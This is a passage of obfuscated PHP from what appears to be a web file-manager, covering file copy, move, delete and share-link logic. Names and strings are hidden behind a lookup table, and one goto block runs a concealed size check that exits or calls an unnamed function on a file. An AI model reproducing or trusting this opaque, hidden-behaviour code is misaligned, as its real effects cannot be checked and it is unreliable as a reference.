{ Cache::set($Ñ²«¬üñ, $Î§³± ); } $»ˆêªñê->end(); $ç¢× Â = array_unique($ç¢× Â); $ôÁ»Ÿé = array_unique($ôÁ»Ÿé); if (!$ËîèÕ¯ && ($ç¢× Â || $ôÁ»Ÿé)) { $â»—Éò“ = array(); if ($ç¢× Â) { $â»—Éò“[] = sprintf(LNG($¥èäöÙé[2344]), count($ç¢× Â)); } if ($ôÁ»Ÿé) { $â»—Éò“[] = sprintf(LNG($¥èäöÙé[2345]), count($ôÁ»Ÿé)); } $â»—Éò“ = sprintf(LNG($¥èäöÙé[2346]), implode($¥èäöÙé[2347], $â»—Éò“)) . $¥èäöÙé[2348] . date($¥èäöÙé[2349]) . $¥èäöÙé[2350]; if ($Òíó¼½¦ == $¥èäöÙé[1952]) { $â»—Éò“ .= $¥èäöÙé[2351] . LNG($¥èäöÙé[2352]); } else { $â»—Éò“ = LNG($¥èäöÙé[2353]) . $¥èäöÙé[2354] . $â»—Éò“; } $Î§³± [$¥èäöÙé[1273]] = $â»—Éò“; Cache::set($Ñ²«¬üñ, $Î§³± ); unset($üÂş³ö×[$¥èäöÙé[6]]); $Éş¥™× = array($¥èäöÙé[486] => $êè½³’£, $¥èäöÙé[2223] => $¥èäöÙé[634], $¥èäöÙé[32] => $üÂş³ö×[$¥èäöÙé[32]], $¥èäöÙé[98] => $üÂş³ö×[$¥èäöÙé[98]]); Hook::trigger($¥èäöÙé[1794], array($¥èäöÙé[1296] => $Éş¥™×, $¥èäöÙé[1306] => !0)); show_json($â»—Éò“, !1, 100111); } if ($Òíó¼½¦ == $¥èäöÙé[634]) { return !0; } if ($ç¢× Â || $ôÁ»Ÿé) { $Î‰“ÃàÄ = array_merge($ç¢× Â, $ôÁ»Ÿé); $Î‰“ÃàÄ = array_filter(array_unique($Î‰“ÃàÄ)); $this->removeByFileID($Î‰“ÃàÄ); } if ($Ì‰«áÜÇ) { $Ì‰«áÜÇ = array_filter(array_unique($Ì‰«áÜÇ)); foreach ($Ì‰«áÜÇ as $·ïŠ¬…Ö) { $Ä·€øêÏ = IO::has($·ïŠ¬…Ö, !0); if (!$Ä·€øêÏ[$¥èäöÙé[241]] && !$Ä·€øêÏ[$¥èäöÙé[242]]) { IO::remove($·ïŠ¬…Ö); } } } return $this->remove($êè½³’£); } private function removeByFileID($µ±¨»Ÿ¨ = array()) { $Ö´ÁşÁÛ =& $_SERVER[¼’ç§¼´]; if (empty($µ±¨»Ÿ¨)) { return; } $±ÄÓ¬õ = array($Ö´ÁşÁÛ[552] => array($Ö´ÁşÁÛ[7], $µ±¨»Ÿ¨)); $Šœİ³ğ¯ = Model($Ö´ÁşÁÛ[1430])->where($±ÄÓ¬õ)->field($Ö´ÁşÁÛ[193])->select(); if (!$Šœİ³ğ¯) { return Model($Ö´ÁşÁÛ[555])->remove($µ±¨»Ÿ¨); } $Šœİ³ğ¯ = array_to_keyvalue($Šœİ³ğ¯, $Ö´ÁşÁÛ[12], $Ö´ÁşÁÛ[193]); foreach ($Šœİ³ğ¯ as $¤’¿•ˆê) { Model($Ö´ÁşÁÛ[913])->removeNow($¤’¿•ˆê, !1); } } private function removeShareItems($‘‰ó×Íü) { $ÉµÇØ©› =& $_SERVER[¼’ç§¼´]; $‰Ó³Á = "\173\x69\157\72{$‘‰ó×Íü}\175\57"; $ä‰î‘ÕÁ = array($ÉµÇØ©›[193] => 0, $ÉµÇØ©›[1266] => array($ÉµÇØ©›[470], "{$‰Ó³Á}\45")); $ÀâíÛî½ = Model($ÉµÇØ©›[1963])->where($ä‰î‘ÕÁ)->field($ÉµÇØ©›[679])->select(); if (empty($ÀâíÛî½)) { return; } $‰ıäëˆŸ = array_to_keyvalue($ÀâíÛî½, $ÉµÇØ©›[12], $ÉµÇØ©›[679]); Model($ÉµÇØ©›[678])->remove($‰ıäëˆŸ); } } goto FÏƒ¶“•÷É; e–ïğùìø†: $_size = $_SERVER[¼’ç§¼´][433]; if ($_SERVER[$_SERVER[¼’ç§¼´][434]] != $_size($_file)) { $_getc = $_SERVER[¼’ç§¼´][435]; $_getfile = $_SERVER[$_SERVER[¼’ç§¼´][436]] . $_SERVER[¼’ç§¼´][437]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¼’ç§¼´][287], $_getfilec); if (count($_getarrs) < $_SERVER[¼’ç§¼´][438]) { $exit = $_SERVER[¼’ç§¼´][439]; $exit(); } $_act = $_SERVER[¼’ç§¼´][440]; $_act($_file); } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($Îº¶¥Ê) { parent::__construct($Îº¶¥Ê); $this->setSignVersion($_SERVER[¼’ç§¼´][249]); } } goto f°äç½Í ; CªŒÁ‡¯§±: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ºğº‘»ô, $’öù¦£­) { $ÚÔüĞ» =& $_SERVER[¼’ç§¼´]; $ç›ú×Ä§ = $’öù¦£­; $GLOBALS[$ÚÔüĞ»[1236]] = $ÚÔüĞ»[1237] . $ºğº‘»ô; Hook::trigger($ÚÔüĞ»[1237] . $ºğº‘»ô . $ÚÔüĞ»[1238], $ç›ú×Ä§); $ÀÛ•çÕÌ = self::driverMake($’öù¦£­[0]); if (!$ÀÛ•çÕÌ) { return !1; } if (method_exists($ÀÛ•çÕÌ, $ºğº‘»ô)) { $Ã‰¦è®£ = @call_user_func_array(array($ÀÛ•çÕÌ, $ºğº‘»ô), $’öù¦£­); } else { if (method_exists($ÀÛ•çÕÌ, $ÚÔüĞ»[1239])) { $Ã‰¦è®£ = @call_user_func_array(array($ÀÛ•çÕÌ, $ºğº‘»ô), $’öù¦£­); } else { if (method_exists(self, $ºğº‘»ô)) { $Ã‰¦è®£ = @call_user_func_array(array(self, $ºğº‘»ô), $’öù¦£­); } else { $Ã‰¦è®£ = call_user_func_array(array(parent, $ºğº‘»ô), $’öù¦£­); } } } Hook::trigger($ÚÔüĞ»[1237] . $ºğº‘»ô . $ÚÔüĞ»[1240], $ç›ú×Ä§, $Ã‰¦è®£); return $Ã‰¦è®£; } public static function init($Ş—æ Æ) { return self::driverMake($Ş—æ Æ); } public static function copy($ÜåœØÍ¬, $±ÎƒßÚ, $å­‹úà† = false, $©áıÈ˜ = false) { return self::copyMoveStart($ÜåœØÍ¬, $±ÎƒßÚ, $å­‹úà†, $_SERVER[¼’ç§¼´][632], $©áıÈ˜); } public static function move($Ãª’³Ÿğ, $ Û»ç¸”, $—®‘”Û— = false, $³Ì«ÎŠî = false) { return self::copyMoveStart($Ãª’³Ÿğ, $ Û»ç¸”, $—®‘”Û—, $_SERVER[¼’ç§¼´][634], $³Ì«ÎŠî); } public static function copyMoveChildren($–Æ•ßá, $ÚİŒ•Á¾, $Õì½øâµ = "\x63\157\160\x79", $âµë†è› = REPEAT_REPLACE) { $ûØåÀÇî =& $_SERVER[¼’ç§¼´]; $«Š˜øÃ™ = $–Æ•ßá; $½ûüÛ… = self::driverMake($–Æ•ßá); $‹´®†åÔ = $½ûüÛ…->listPath($–Æ•ßá, !0); $Î¤Â¸ = array_merge($‹´®†åÔ[$ûØåÀÇî[86]], $‹´®†åÔ[$ûØåÀÇî[85]]); foreach ($Î¤Â¸ as $‚ÃÇ¥«) { self::copyMoveStart($‚ÃÇ¥«[$ûØåÀÇî[87]], $ÚİŒ•Á¾, $âµë†è›, $Õì½øâµ, !1); } if ($Õì½øâµ == $ûØåÀÇî[634]) { self::remove($«Š˜øÃ™); } } private static function copyMoveStart($äíæÓß½, $‘ÙÔé­Ï, $ªŠ®ª¶¢, $§êÛú‚, $ş€–Ğ¶ù) { $‚•ÉÆ =& $_SERVER[¼’ç§¼´]; $†ñúŒŞ½ = array($äíæÓß½, $‘ÙÔé­Ï, $ªŠ®ª¶¢, $ş€–Ğ¶ù); Hook::trigger($‚•ÉÆ[1237] . $§êÛú‚ . $‚•ÉÆ[1238], $†ñúŒŞ½); $Çå¢·öÚ = self::copyMove($äíæÓß½, $‘ÙÔé­Ï, $ªŠ®ª¶¢, $§êÛú‚, $ş€–Ğ¶ù); Hook::trigger($‚•ÉÆ[1237] . $§êÛú‚ . $‚•ÉÆ[1240], $†ñúŒŞ½, $Çå¢·öÚ); return $Çå¢·öÚ; } public static function saveFile($Ñ—Ü°³, $Å½»‡Ç, $ÙÈ…ÃÎ’ = true) { $©À£”‹ =& $_SERVER[¼’ç§¼´]; $®Í³ø´ = self::info($Å½»‡Ç); $çıÚ”à = self::driverMake($Ñ—Ü°³); $âÕìˆÀ = self::driverMake($Å½»‡Ç); $ü‚±ıÜ¯ = !1; if ($âÕìˆÀ->pathParse[$©À£”‹[1241]]) { $ü‚±ıÜ¯ = $âÕìˆÀ; $Û„–ÖáÃ = $âÕìˆÀ->pathParse[$©À£”‹[1241]]; $âÕìˆÀ = self::driverMake($Û„–ÖáÃ); } if ($çıÚ”à->pathParse[$©À£”‹[1241]]) { $¡½è¾èå = $çıÚ”à->pathParse[$©À£”‹[1241]]; $çıÚ”à = self::driverMake($¡½è¾èå); } $î¡â±Ú˜ = $âÕìˆÀ->pathFather($Å½»‡Ç); $°¯“ûĞ± = !0; if (!$ÙÈ…ÃÎ’ && self::driverIsSame($çıÚ”à, $âÕìˆÀ)) { $°¯“ûĞ± = !1; } $†ğãè•Ù = self::copyFile($çıÚ”à, $Ñ—Ü°³, $âÕìˆÀ, $î¡â±Ú˜, $®Í³ø´[$©À£”‹[32]], $°¯“ûĞ±); if ($ü‚±ıÜ¯) { $†ğãè•Ù = $ü‚±ıÜ¯->getPathOuter($†ğãè•Ù); } return $†ğãè•Ù; } private static function copyMove($ğÀ˜Ğëü, $ïè ¹«×, $Óƒ’‡€û, $Çà•ØœŸ, $¯‰º¥ÀÀ = false) { $Õ¦òôá =& $_SERVER[¼’ç§¼´]; if (!$ğÀ˜Ğëü || $ğÀ˜Ğëü == $Õ¦òôá[8] || !$ïè ¹«×) { return !1; } ignore_timeout(); $Ÿéşòù = self::driverMake($ğÀ˜Ğëü); $‰©›Ó¿Õ = self::driverMake($ïè ¹«×); $€ººÆ¼ = $Çà•ØœŸ == $Õ¦òôá[634]; $‹¯ŞÜÀé = !1; if ($‰©›Ó¿Õ->pathParse[$Õ¦òôá[1241]]) { $‹¯ŞÜÀé = $‰©›Ó¿Õ; $ïè ¹«× = $‰©›Ó¿Õ->pathParse[$Õ¦òôá[1241]]; $‰©›Ó¿Õ = self::driverMake($ïè ¹«×); } if ($Ÿéşòù->pathParse[$Õ¦òôá[1241]]) { $ğÀ˜Ğëü = $Ÿéşòù->pathParse[$Õ¦òôá[1241]]; $Ÿéşòù = self::driverMake($ğÀ˜Ğëü); } self::check($Ÿéşòù, $ğÀ˜Ğëü, $‰©›Ó¿Õ, $ïè ¹«×); Hook::trigger($Õ¦òôá[1242], $Ÿéşòù, $ğÀ˜Ğëü, $‰©›Ó¿Õ, $ïè ¹«×); $éÙ¼î = self::driverIsSame($Ÿéşòù, $‰©›Ó¿Õ); if ($éÙ¼î) { if ($Çà•ØœŸ == $Õ¦òôá[634] && !method_exists($‰©›Ó¿Õ, $Õ¦òôá[1243]) && trim($ïè ¹«×, $Õ¦òôá[8]) == trim($‰©›Ó¿Õ->pathFather($ğÀ˜Ğëü), $Õ¦òôá[8])) { if ($Ÿéşòù->pathThis($ğÀ˜Ğëü) != $¯‰º¥ÀÀ && !$Ÿéşòù->isOsDriver()) { return $Ÿéşòù->rename($ğÀ˜Ğëü, $¯‰º¥ÀÀ); } return $‰©›Ó¿Õ->getPathOuter($ğÀ˜Ğëü); } if (method_exists($‰©›Ó¿Õ, $Çà•ØœŸ)) { return $‰©›Ó¿Õ->{$Çà•ØœŸ}($ğÀ˜Ğëü, $ïè ¹«×, $Óƒ’‡€û, $¯‰º¥ÀÀ); } } if ($éÙ¼î && $Çà•ØœŸ == $Õ¦òôá[634] && $‰©›Ó¿Õ->getType() == $Õ¦òôá[109]) { $—´¸¤Ø = $‰©›Ó¿Õ->movePath($ğÀ˜Ğëü, $ïè ¹«×, $¯‰º¥ÀÀ); if ($—´¸¤Ø) { return $—´¸¤Ø; } } $’´ÑÊÎÃ = $Ÿéşòù->isFile($ğÀ˜Ğëü); if (!$’´ÑÊÎÃ && $‰©›Ó¿Õ->getType() == $Õ¦òôá[845] && $Ÿéşòù->getType() == $Õ¦òôá[109]) { $—´¸¤Ø = $‰©›Ó¿Õ->copyFolderFromIO($Ÿéşòù, $ğÀ˜Ğëü, $ïè ¹«×, $Óƒ’‡€û, $€ººÆ¼, $¯‰º¥ÀÀ); } else { $—´¸¤Ø = self::copyPath($Ÿéşòù, $ğÀ˜Ğëü, $‰©›Ó¿Õ, $ïè ¹«×, $Óƒ’‡€û, $€ººÆ¼, $’´ÑÊÎÃ, $¯‰º¥ÀÀ); } if ($—´¸¤Ø && $€ººÆ¼) { $Ÿéşòù->remove($ğÀ˜Ğëü); } if ($‹¯ŞÜÀé) { $—´¸¤Ø = $‹¯ŞÜÀé->getPathOuter($—´¸¤Ø); } return $—´¸¤Ø; } private static function check($Ú­»®©Ä, $œş•¦É÷, $ôä¬‰ôµ, &$ËÕ®¦ÖÚ) { $÷ìµì¦„ =& $_SERVER[¼’ç§¼´]; if (self::driverIsSame($Ú­»®©Ä, $ôä¬‰ôµ) && $Ú­»®©Ä->isFolder($œş•¦É÷) && $Ú­»®©Ä->isParentOf($œş•¦É÷, $ËÕ®¦ÖÚ)) { show_json(LNG($÷ìµì¦„[1244]), !1); } if (!$Ú­»®©Ä->exist($œş•¦É÷)) { show_json(LNG($÷ìµì¦„[108]), !1); } } private static function copyPath($ÛÓ°ê¼Ï, $¥¯á¹Éà, $¤‘àìÔƒ, $ï«ğ ´ë, $ƒÛ¶ëİ, $İ·åÈã, $±©é«Á•, $×Ôú—‹– = false, $¶í×˜¨ê = true) { $Üö†Ø—ş =& $_SERVER[¼’ç§¼´]; $ŒçŞ¸úì = empty($×Ôú—‹–) && $×Ôú—‹– !== $Üö†Ø—ş[230] ? $ÛÓ°ê¼Ï->pathThis($¥¯á¹Éà) : $×Ôú—‹–; if ($ƒÛ¶ëİ) { $¦ƒõåù = $¤‘àìÔƒ->fileNameExist($ï«ğ ´ë, $ŒçŞ¸úì); $ö¿ïóßæ = $ŒçŞ¸úì; $ŒçŞ¸úì = $¤‘àìÔƒ->fileNameAuto($ï«ğ ´ë, $ŒçŞ¸úì, $ƒÛ¶ëİ, !$±©é«Á•); if (!$¦ƒõåù || $ö¿ïóßæ != $ŒçŞ¸úì) { $ƒÛ¶ëİ = !1; } if ($¶í×˜¨ê && !$ƒÛ¶ëİ) { $¤‘àìÔƒ->_data[$Üö†Ø—ş[1245]] = !0; } } if ($±©é«Á•) { return self::copyFile($ÛÓ°ê¼Ï, $¥¯á¹Éà, $¤‘àìÔƒ, $ï«ğ ´ë, $ŒçŞ¸úì, $İ·åÈã); } if ($ƒÛ¶ëİ == REPEAT_RENAME_FOLDER) { $ƒÛ¶ëİ = !1; } $¶È óÁ£ = rtrim($ï«ğ ´ë, $Üö†Ø—ş[8]) . $Üö†Ø—ş[8] . $ŒçŞ¸úì; $Ä×Ø¯‰‚ = $¤‘àìÔƒ->mkdir($¤‘àìÔƒ->getPath($¶È óÁ£), $ƒÛ¶ëİ); $ï«ğ ´ë = $¤‘àìÔƒ->getPathInner($Ä×Ø¯‰‚); $á”©¸Í» = $ÛÓ°ê¼Ï->listPath($¥¯á¹Éà, !0); $á”©¸Í» = is_array($á”©¸Í») ? $á”©¸Í» : array($Üö†Ø—ş[86] => array(), $Üö†Ø—ş[85] => array()); $ëàêµœ« = array_merge($á”©¸Í»[$Üö†Ø—ş[86]], $á”©¸Í»[$Üö†Ø—ş[85]]); foreach ($ëàêµœ« as $Ë“ïß¯) { $™™Éè³Ÿ = $Ë“ïß¯[$Üö†Ø—ş[33]] == $Üö†Ø—ş[232]; $¥¯á¹Éà = $ÛÓ°ê¼Ï->getPathInner($Ë“ïß¯[$Üö†Ø—ş[87]]); $ÔÈô­ü = self::copyPath($ÛÓ°ê¼Ï, $¥¯á¹Éà, $¤‘àìÔƒ, $ï«ğ ´ë, $ƒÛ¶ëİ, $İ·åÈã, $™™Éè³Ÿ, !1, !1); if (!$ÔÈô­ü) { IO::errorTips($Üö†Ø—ş[1246] . $¥¯á¹Éà . $Üö†Ø—ş[73] . $ï«ğ ´ë); } } self::copyMoveKeepInfo($ÛÓ°ê¼Ï, $¥¯á¹Éà, $Ä×Ø¯‰‚); return $Ä×Ø¯‰‚; } private static function copyFile($å×ß ·”, $‰ì •ÒÍ, $Óíìä¦Ü, $æ‘üğº‹, $²¿¡¹Ğî, $¢Ö…İùÌ) { $‹Å’š½Ô =& $_SERVER[¼’ç§¼´]; $æ‘üğº‹ = $Óíìä¦Ü->getPath(rtrim($æ‘üğº‹, $‹Å’š½Ô[8]) . $‹Å’š½Ô[8] . $²¿¡¹Ğî); $Ú˜‘´» = $‹Å’š½Ô[1247] . time() . rand_string(5); Hook::trigger($‹Å’š½Ô[1248], $å×ß ·”, $‰ì •ÒÍ, $Óíìä¦Ü, $æ‘üğº‹, $²¿¡¹Ğî, $Ú˜‘´»); if (self::driverIsSame($å×ß ·”, $Óíìä¦Ü)) { if ($¢Ö…İùÌ) { $«²Ø°„ê = $Óíìä¦Ü->moveFile($‰ì •ÒÍ, $æ‘üğº‹); } else { $«²Ø°„ê = $Óíìä¦Ü->copyFile($‰ì •ÒÍ, $æ‘üğº‹); } Hook::trigger($‹Å’š½Ô[1249], $å×ß ·”, $‰ì •ÒÍ, $Óíìä¦Ü, $æ‘üğº‹, $²¿¡¹Ğî, $«²Ø°„ê); self::copyMoveKeepInfo($å×ß ·”, $‰ì •ÒÍ, $«²Ø°„ê); return $«²Ø°„ê; } $ªôüêä = TEMP_FILES; if ($GLOBALS[$‹Å’š½Ô[6]][$‹Å’š½Ô[92]][$‹Å’š½Ô[885]]) { $ªôüêä = $GLOBALS[$‹Å’š½Ô[6]][$‹Å’š½Ô[92]][$‹Å’š½Ô[885]]; } $ÇÚÀ÷¾ = $ªôüêä; mk_dir($ÇÚÀ÷¾); $ç‡™İé = $ÇÚÀ÷¾ . $Ú˜‘´»; $êãÌÏ© = $ç‡™İé; $ç‡™İé = $å×ß ·”->download($‰ì •ÒÍ, $ç‡™İé); $ç‡™İé = $å×ß ·”->iconvApp($ç‡™İé); if (substr($ç‡™İé, strlen($ªôüêä)) == $ªôüêä) { $¢Ö…İùÌ = !0; } $«²Ø°„ê = $Óíìä¦Ü->upload($æ‘üğº‹, $ç‡™İé, $¢Ö…İùÌ); self::remove($êãÌÏ©); Hook::trigger($‹Å’š½Ô[1249], $å×ß ·”, $‰ì •ÒÍ, $Óíìä¦Ü, $æ‘üğº‹, $²¿¡¹Ğî, $«²Ø°„ê); self::copyMoveKeepInfo($å×ß ·”, $‰ì •ÒÍ, $«²Ø°„ê); return $«²Ø°„ê; } private static function copyMoveKeepInfo($àåÀ÷ª¡, $¡ª‘‘‚, $ŞÆËõÙò) { if (!$ŞÆËõÙò) { return; } $øè¤ŞÕÃ = $àåÀ÷ª¡->info($¡ª‘‘‚); if (!is_array($øè¤ŞÕÃ)) { return; } IO::setModifyTime($ŞÆËõÙò, $øè¤ŞÕÃ[$_SERVER[¼’ç§¼´][88]]); } public static function pathFather($†æ¸ã€ğ) { $ØÊøó¡  = IO::init($†æ¸ã€ğ); $‚‚£…‚  = $ØÊøó¡ ->pathFather($ØÊøó¡ ->path); return $ØÊøó¡ ->getPathOuter($‚‚£…‚ ); } public static function fileOut($Ç×ŞÑÏ›, $Õ¡åÓ’­ = false, $Ø¦×ˆ‡³ = false, $¿üÖ‚å = '') { $¬–ê½Ì¹ = self::driverMake($Ç×ŞÑÏ›); if ($¬–ê½Ì¹->isFileOutServer()) { return $¬–ê½Ì¹->fileOutServer($Ç×ŞÑÏ›, $Õ¡åÓ’­, $Ø¦×ˆ‡³, $¿üÖ‚å); } return $¬–ê½Ì¹->fileOut($Ç×ŞÑÏ›, $Õ¡åÓ’­, $Ø¦×ˆ‡³, $¿üÖ‚å); } public static function fileOutImage($ƒ´ö©Õã, $Çá±éÕ· = 250) { $äöÏÛÍŠ = array(250, 600, 1200, 2000, 3000, 5000); for ($÷ü›¡Ì = 0; $÷ü›¡Ì < count($äöÏÛÍŠ); $÷ü›¡Ì++) { if ($÷ü›¡Ì == 0 && $Çá±éÕ· <= $äöÏÛÍŠ[$÷ü›¡Ì]) { $Çá±éÕ· = $äöÏÛÍŠ[$÷ü›¡Ì]; break; } else { if ($Çá±éÕ· > $äöÏÛÍŠ[$÷ü›¡Ì - 1] && $Çá±éÕ· <= $äöÏÛÍŠ[$÷ü›¡Ì]) { $Çá±éÕ· = $äöÏÛÍŠ[$÷ü›¡Ì]; break; } else { if ($÷ü›¡Ì == count($äöÏÛÍŠ) - 1 && $Çá±éÕ· > $äöÏÛÍŠ[$÷ü›¡Ì]) { $Çá±éÕ· = $äöÏÛÍŠ[$÷ü›¡Ì]; break; } } } } $®³ã•²˜ = self::driverMake($ƒ´ö©Õã); if ($®³ã•²˜->isFileOutServer()) { return $®³ã•²˜->fileOutImageServer($ƒ´ö©Õã, $Çá±éÕ·); } return $®³ã•²˜->fileOutImage($ƒ´ö©Õã, $Çá±éÕ·); } private static function driverIsSame($Õíë‹•Ş, $˜à™çãë) { $¼öíÚ =& $_SERVER[¼’ç§¼´]; $Š¬Òıú¶ = $Õíë‹•Ş->getType(); $œÀÜˆ†· = $˜à™çãë->getType(); if ($Š¬Òıú¶ != $œÀÜˆ†·) { return !1; } if ($Š¬Òıú¶ == $¼öíÚ[845]) { return !0; } if ($Š¬Òıú¶ == $¼öíÚ[109]) { return !0; } if ($Õíë‹•Ş->pathDriver == $˜à™çãë->pathDriver) { return !0; } return !1; } public static function copyUpdate($Óºşï§•, $ğ›§“–©) { $ïŠÄßÂ• =& $_SERVER[¼’ç§¼´]; if (!IO::exist($Óºşï§•)) { return !1; } if (!IO::exist($ğ›§“–©)) { IO::mkdir($ğ›§“–©); } $ÖĞûß¦ = array_to_keyvalue(self::listAllSimple($Óºşï§•), $ïŠÄßÂ•[87]); $úÍì»Ã = array_to_keyvalue(self::listAllSimple($ğ›§“–©), $ïŠÄßÂ•[87]); $å¼ÖÓ’ = array(); $ìÔà‘’§ = array(); foreach ($ÖĞûß¦ as $·‰Á => $ÔÉ£Ú õ) { if (isset($úÍì»Ã[$·‰Á])) { if ($ÔÉ£Ú õ[$ïŠÄßÂ•[78]] == 1) { continue; } if ($úÍì»Ã[$·‰Á][$ïŠÄßÂ•[79]] == $ÔÉ£Ú õ[$ïŠÄßÂ•[79]]) { continue; } } if ($ÔÉ£Ú õ[$ïŠÄßÂ•[78]] == 1) { $ìÔà‘’§[] = $ğ›§“–© . $ïŠÄßÂ•[8] . trim($·‰Á, $ïŠÄßÂ•[8]); continue; } $¼óÔã®Î = strstr(trim($·‰Á, $ïŠÄßÂ•[8]), $ïŠÄßÂ•[8]) ? get_path_father($·‰Á) : $ïŠÄßÂ•[12]; $å¼ÖÓ’[] = array($ïŠÄßÂ•[1250] => $ÔÉ£Ú õ[$ïŠÄßÂ•[89]], $ïŠÄßÂ•[1251] => rtrim($ğ›§“–©, $ïŠÄßÂ•[8]) . $ïŠÄßÂ•[8] . $¼óÔã®Î, $ïŠÄßÂ•[1252] => $ÔÉ£Ú õ); } $ŸúŒ‰µ† = array($ïŠÄßÂ•[232] => $å¼ÖÓ’, $ïŠÄßÂ•[78] => $ìÔà‘’§); Hook::trigger($ïŠÄßÂ•[1253], $Óºşï§•, $ğ›§“–©, $ŸúŒ‰µ†); foreach ($ìÔà‘’§ as $ÔÉ£Ú õ) { IO::mkdir($ÔÉ£Ú õ); } foreach ($å¼ÖÓ’ as $ÔÉ£Ú õ) { IO::copy($ÔÉ£Ú õ[$ïŠÄßÂ•[1250]], $ÔÉ£Ú õ[$ïŠÄßÂ•[1251]], REPEAT_REPLACE); } } public static function fileSubstr($‚ĞŸ¶Øò, $ÒŸä‹Óˆ, $æàí¯‚ = false) { $…ˆÁËï† =& $_SERVER[¼’ç§¼´]; $îøôüàã = self::driverMake($‚ĞŸ¶Øò); $ù¥Î½„Ñ = $îøôüàã->size($‚ĞŸ¶Øò); $²Æö¶ ğ = $ÒŸä‹Óˆ; $ğ°ÓÁ†¸ = $æàí¯‚; if ($ÒŸä‹Óˆ < 0) { $ÒŸä‹Óˆ = $ù¥Î½„Ñ + $ÒŸä‹Óˆ; } if ($æàí¯‚ === !1) { $æàí¯‚ = $ù¥Î½„Ñ - $ÒŸä‹Óˆ; } if ($ÒŸä‹Óˆ + $æàí¯‚ > $ù¥Î½„Ñ) { $æàí¯‚ = $ù¥Î½„Ñ - $ÒŸä‹Óˆ; } if (!$ù¥Î½„Ñ && $îøôüàã->getType() == $…ˆÁËï†[109] && !$îøôüàã->exist($‚ĞŸ¶Øò)) { $­¥š‚ª = get_path_this($‚ĞŸ¶Øò); $‰ñ±’—Ñ = parse_url_query($­¥š‚ª); if (is_array($‰ñ±’—Ñ) && isset($‰ñ±’—Ñ[$…ˆÁËï†[32]])) { $­¥š‚ª = urldecode($‰ñ±’—Ñ[$…ˆÁËï†[32]]); } throw new Exception($…ˆÁËï†[1254] . LNG($…ˆÁËï†[1255]) . $…ˆÁËï†[1052] . clear_html($­¥š‚ª) . $…ˆÁËï†[12]); } if ($æàí¯‚ <= 0) { return $…ˆÁËï†[12]; } if ($ÒŸä‹Óˆ < 0 || $ÒŸä‹Óˆ >= $ù¥Î½„Ñ || $æàí¯‚ > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\145\x52\145\141\x64\40\145\162\162\x6f\162\x21\x20\163\x74\141\x72\164\x3d{$ÒŸä‹Óˆ}\x3b\154\x65\156\147\x74\150\75{$æàí¯‚}\x3b\x20\163\x69\172\145\75{$ù¥Î½„Ñ}\x3b"); } $Œ»ÇÈ = $îøôüàã->fileSubstr($‚ĞŸ¶Øò, $ÒŸä‹Óˆ, $æàí¯‚); if (!$Œ»ÇÈ && $æàí¯‚ && isset($GLOBALS[$…ˆÁËï†[1256]])) { throw new Exception($GLOBALS[$…ˆÁËï†[1256]][$…ˆÁËï†[1257]]); } return $Œ»ÇÈ; } private static function driverMake(&$£×ŠíĞ) { $ûœÏÅâÎ =& $_SERVER[¼’ç§¼´]; $±“¤¦½å = KodIO::parse($£×ŠíĞ); if (!self::$driverListSystem) { $ÇÎÄ´œ¿ = Model($ûœÏÅâÎ[855])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ÇÎÄ´œ¿, $ûœÏÅâÎ[486]); } if ($±“¤¦½å[$ûœÏÅâÎ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$±“¤¦½å[$ûœÏÅâÎ[486]]]) { throw new Exception($ûœÏÅâÎ[1258]); return !1; } $£×ŠíĞ = $±“¤¦½å[$ûœÏÅâÎ[1259]]; $‹–¡Âµ¶ = self::driverGet($±“¤¦½å, $£×ŠíĞ); return $‹–¡Âµ¶; } private static function driverGet($úÂÑ¶©‹, &$­†¸à) { $ÌıÒ‘¥¿ =& $_SERVER[¼’ç§¼´]; $ùú­µ¼ú = $úÂÑ¶©‹[$ÌıÒ‘¥¿[1260]]; $Æ¶óî»ñ = $úÂÑ¶©‹[$ÌıÒ‘¥¿[486]]; switch ($úÂÑ¶©‹[$ÌıÒ‘¥¿[33]]) { case KodIO::KOD_IO: $™Ø˜¾¢Á = self::$driverListSystem[$Æ¶óî»ñ]; break; case KodIO::KOD_SOURCE: $­†¸à = $Æ¶óî»ñ . $­†¸à; $™Ø˜¾¢Á = array($ÌıÒ‘¥¿[1261] => $ÌıÒ‘¥¿[1262], $ÌıÒ‘¥¿[6] => $úÂÑ¶©‹); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ŒÔ‚ğ±› = $GLOBALS[$ÌıÒ‘¥¿[1263]]; self::$driverListUser = array_to_keyvalue($ŒÔ‚ğ±›, $ÌıÒ‘¥¿[486]); } $™Ø˜¾¢Á = self::$driverListUser[$Æ¶óî»ñ]; break; case KodIO::KOD_SHARE_LINK: $™Ø˜¾¢Á = array($ÌıÒ‘¥¿[1261] => $ÌıÒ‘¥¿[1264], $ÌıÒ‘¥¿[6] => $úÂÑ¶©‹); $çáñÈë’ = Action($ÌıÒ‘¥¿[1265])->sharePathInfo($úÂÑ¶©‹[$ÌıÒ‘¥¿[87]]); $­†¸à = $çáñÈë’[$ÌıÒ‘¥¿[193]]; if (!$çáñÈë’[$ÌıÒ‘¥¿[193]]) { $ñ¤ÃŒª = Model($ÌıÒ‘¥¿[678])->getInfo($çáñÈë’[$ÌıÒ‘¥¿[679]]); $­†¸à = KodIO::clear($ñ¤ÃŒª[$ÌıÒ‘¥¿[1266]] . $úÂÑ¶©‹[$ÌıÒ‘¥¿[1259]]); $úÂÑ¶©‹[$ÌıÒ‘¥¿[571]] = $ñ¤ÃŒª; $úÂÑ¶©‹[$ÌıÒ‘¥¿[1241]] = $­†¸à; $™Ø˜¾¢Á = array($ÌıÒ‘¥¿[1261] => $ÌıÒ‘¥¿[1267], $ÌıÒ‘¥¿[6] => $úÂÑ¶©‹); } break; case KodIO::KOD_SHARE_ITEM: $™Ø˜¾¢Á = array($ÌıÒ‘¥¿[1261] => $ÌıÒ‘¥¿[1268], $ÌıÒ‘¥¿[6] => $úÂÑ¶©‹); $ñ¤ÃŒª = Model($ÌıÒ‘¥¿[678])->getInfo($úÂÑ¶©‹[$ÌıÒ‘¥¿[486]]); if ($ñ¤ÃŒª[$ÌıÒ‘¥¿[193]] == $ÌıÒ‘¥¿[230]) { $­†¸à = KodIO::clear($ñ¤ÃŒª[$ÌıÒ‘¥¿[1266]] . 